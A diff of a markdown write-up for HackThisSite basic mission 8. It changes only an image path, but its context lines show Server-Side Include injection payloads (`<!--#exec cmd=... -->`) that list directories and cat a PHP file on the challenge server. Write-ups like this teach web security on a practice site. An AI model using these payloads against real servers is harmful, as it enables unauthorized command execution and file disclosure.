@@ -9,7 +9,7 @@
 - if you don't know what it is [SSI](https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection)
 - now lets try 	`<!--#exec cmd="cat /var/www/hackthissite.org/html/missions/basic/8/" -->`
 - but i got an error
-- ![answer](/home/hj/hack_this_site/basic_missions/lvl_8/ans.png)
+- ![answer](ans.png)
 - so lets try this `<!--#exec cmd="ls ../" -->`
 - we will find a sus `.php` file
 - now do `<!--#exec cmd="cat ../filename.php" -->`
